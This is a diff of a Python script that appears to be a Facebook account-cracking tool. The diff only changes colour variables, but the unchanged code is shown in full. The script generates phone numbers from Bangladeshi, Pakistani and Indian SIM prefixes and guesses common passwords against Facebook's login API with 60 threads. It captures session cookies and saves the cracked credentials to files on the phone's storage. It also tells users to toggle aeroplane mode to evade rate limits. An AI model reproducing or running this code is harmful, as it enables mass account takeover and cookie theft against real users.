@@ -78,48 +78,48 @@ def line():
 	print(f"{rong}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 	
 #————————{RANDOM-SYSTEM}——————————#
-BDX=f"{W}BD SIM CODE : {G}017 015 018 019 013 016{E}{W}"
-INDX=f"{W}IND SIM CODE : {G}9670 9725 8948 8795 6383{E}{W}"
-PAKX=f"{W}PAK SIM CODE : {G}0306 0315 0335 0345 0318{E}{W}"
-LIMITX=f"EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W}"
+BDX=f"{rong}BD SIM CODE : {rong}017 015 018 019 013 016{rong}{rong}"
+INDX=f"{rong}IND SIM CODE : {rong}9670 9725 8948 8795 6383{E}{rong}"
+PAKX=f"{rong}PAK SIM CODE : {rong}0306 0315 0335 0345 0318{rong}{rong}"
+LIMITX=f"EXAMPLE : {rong}1000{rong},{rong}5000{rong},{rong}10000{rong},{rong}15000{rong},{rong}20000{rong}"
 #————————{TOOL-OPTIONS}——————————#
-CPG=f"[{G}+{W}] Do you went show cp account (y/n)"
-CKIG=f"[{G}+{W}] Do you went show cookie (y/n)"
-chc=f'{W}[{G}+{E}] Choice : {G}'
-flp=f"{W}[{G}•{W}] PUT FILE PATH\033[1;37m : {G}"
-chcps=f'EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}'
-mxxt=f'{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}3{W}]'
-nflp=f"[{R}!{W}] FILE LOCATION NOT FOUND "
+CPG=f"[{rong}+{rong}] Do you went show cp account (y/n)"
+CKIG=f"[{rong}+{rong}] Do you went show cookie (y/n)"
+chc=f'{rong}[{rong}+{rong}] Choice : {rong}'
+flp=f"{rong}[{rong}•{rong}] PUT FILE PATH\033[1;37m : {rong}"
+chcps=f'EXAMPLE: {rong}first123{rong},{rong}last123{rong},{rong}firstlast{rong},{rong}name{rong}'
+mxxt=f'{rong}[{rong}A{rong}] METHOD [{rong}1{rong}]\n{rong}[{rong}B{rong}] METHOD [{rong}2{rong}]\n{rong}[{rong}C{rong}] METHOD [{rong}3{rong}]'
+nflp=f"[{rong}!{rong}] FILE LOCATION NOT FOUND "
 #————————{LOGO}——————————#
 os.system('espeak -a 300 "well,come"')
 def logo():
-	os.system('clear');print(f"""
+	os.system('clear');print(f"""{rong}
 	</> Ahmed < />
 {lmnXua()}""")
 #————————{RANDOM-CRACK-SYSTEM}——————————#
 def Main():
 	logo()
-	print(f' {W}[{G}A{W}]{W} RANDOM CRACK [{G}BANGLADESH{W}]');print(f' {W}[{G}B{W}]{W} RANDOM CRACK [{G}PAKISTAN{W}]');print(f' {W}[{G}C{W}]{W} RANDOM CRACK [{G}INDIA{W}]')
+	print(f' {rong}[{rong}A{rong}]{rong} RANDOM CRACK [{rong}BANGLADESH{rong}]');print(f' {rong}[{rong}B{rong}]{rong} RANDOM CRACK [{rong}PAKISTAN{rong}]');print(f' {rong}[{rong}C{rong}]{rong} RANDOM CRACK [{rong}INDIA{rong}]')
 	line()
-	ghx=input(f' [{G}+{W}] Choice : {G}')
+	ghx=input(f' [{rong}+{rong}] Choice : {rong}')
 	if ghx in ["A","a","1"]:rcd.append(f'1');rmenu1()
 	elif ghx in ["B","b","2"]:rcd.append(f'2');rmenu1()
 	elif ghx in ["C","c","3"]:rcd.append(f'3');rmenu1()
-	else:line();print(f'\n \t {R}Choose valid option{E}');time.sleep(1);Main()
+	else:line();print(f'\n \t {rong}Choose valid option{rong}');time.sleep(1);Main()
 #————————{RANDOM-MENU-SYSTEM}——————————#
 def rmenu1():
 	logo()
 	if "1" in rcd:print(f"{BDX}");line()
 	if "2" in rcd:print(f"{PAKX}");line()
 	if "3" in rcd:print(f"{INDX}");line()
-	code=input(f'{chc}');print(f"{W}{40*'='}")
+	code=input(f'{chc}');print(f"{rong}{40*'='}")
 	print(f'{LIMITX}');line()
-	limit=int(input(f'[{G}+{E}] Limit : {G}'))
-	print(f"{W}{40*'='}");print(f'{CPG}');line()
+	limit=int(input(f'[{rong}+{rong}] Limit : {rong}'))
+	print(f"{rong}{40*'='}");print(f'{CPG}');line()
 	cx=input(f'[{chc}')
 	if cx in ['n','N','no','NO','2']:cpx.append(f'n')
 	else:cpx.append(f'y')
-	print(f"{W}{40*'='}");print(f'{CKIG}');line()
+	print(f"{rong}{40*'='}");print(f'{CKIG}');line()
 	ckiv=input(f'{chc}')
 	if ckiv in ['n','N','no','NO','2']:cokix.append(f'n')
 	else:cokix.append(f'y')
@@ -129,7 +129,7 @@ def rmenu1():
 		if "3" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(6));xode.append(numberx)
 	with ThreadPool(max_workers=60) as tonxoys:
 		tid= str(len(xode))
-		logo();print(f' [{G}•{W}] TOTAL ID :\033[1;92m '+tid);print (f' {W}[{G}•{W}] \033[1;97mSIM CODE : \033[1;92m'+code);print(f' {W}[{G}•{W}] \033[1;37mTHE PROCESS HAS BEEN STARTED');print(f' [{G}•{W}] \033[1;37mUSE AEROPLANE MODE IN EVERY 5 MIN ');print(40*"=")
+		logo();print(f' [{rong}•{rong}] TOTAL ID :\033[1;92m '+tid);print (f' {rong}[{rong}•{rong}] \033[1;97mSIM CODE : \033[1;92m'+code);print(f' {rong}[{rong}•{rong}] \033[1;37mTHE PROCESS HAS BEEN STARTED');print(f' [{rong}•{rong}] \033[1;37mUSE AEROPLANE MODE IN EVERY 5 MIN ');print(40*"=")
 		for rngx in xode:
 			id=code+rngx
 			if "1" in rcd:psd=[id,rngx,id[:6],id[:7],id[:8],id[5:],"bangladesh","i love you","jannat","sadia@#","abusayid","taniya"]
@@ -141,7 +141,7 @@ lk=[]
 def graphrm(id,psd,tid):
 	global ok,cp,lk,lop
 	togg=[]
-	sys.stdout.write(f'\r\r{BG}[{W}Ahmed-M1{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(cp)));sys.stdout.flush()
+	sys.stdout.write(f'\r\r{rong}[{rong}Ahmed-M1{rong}]{rong}{rong}{rong}[{rong}{lop}{rong}/{rong}{tid}{rong}]{rong}{rong}[{rong}OK{rong}:{rong}%s{rong}/{rong}%s{rong}]{rong}'%(len(ok),len(cp)));sys.stdout.flush()
 	for psw in psd:
 		
 		datax= {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': id,'password': psw,'generate_analytics_claims': '1', 'community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
@@ -154,12 +154,12 @@ def graphrm(id,psd,tid):
 			for xk in cki:ck.update({xk["name"]:xk["value"]})
 			coki = (";").join([ "%s=%s" % (key, value) for key, value in ck.items() ])
 			iid= re.findall('c_user=(.*);xs', coki)[0]
-			print(f'\r\r{G}[Ahmed-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/Ahmed-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
-			if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
+			print(f'\r\r{rong}[Ahmed-OK] {iid} | {psw}{rong}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/Ahmed-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
+			if 'y' in cokix:print(f'\r\r{rong}[{rong}COOKIES🍪{rong}]{rong} : {rong}{coki}{rong}');print(f"{rong}{40*'-'}{rong}")
 			break
 		elif twfx in str(lo):
 			iid = lo['error']['error_data']['uid']
-			print(f'\r\r{BL}[Ahmed-2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('/sdcard/Ahmed-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
+			print(f'\r\r{rong}[Ahmed-2F] {iid} | {psw}{rong}');os.system('espeak -a 300 "two,f id"');open('/sdcard/Ahmed-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
 			twf.append(id)
 			break
 		elif 'www.facebook.com' in lo['error']['message']:
@@ -170,7 +170,7 @@ def graphrm(id,psd,tid):
 			if iid in ok:pass
 			else:
 				if 'y' in cpx:
-					print(f'\r\r{R}[Ahmed-CP] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/Ahmed-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
+					print(f'\r\r{rong}[Ahmed-CP] {iid} | {psw}{rong}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/Ahmed-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
 			break
 		else:continue
 	lop+=1
